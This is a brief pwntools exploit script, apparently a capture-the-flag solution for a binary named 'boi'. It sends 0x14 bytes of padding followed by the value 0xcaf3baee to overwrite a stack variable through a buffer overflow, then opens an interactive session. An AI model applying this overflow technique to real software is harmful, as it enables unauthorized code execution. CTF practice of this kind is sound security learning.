from pwn import *
p = process("./boi")
p.recvuntil('\n')
# gdb.attach(p, gdbscript="break *0x000000000040068f")
offset = 0x14
target_value = 0xcaf3baee

payload = b'a'*offset
payload +=p64(target_value)
print(payload)
p.sendline(payload)
p.interactive()
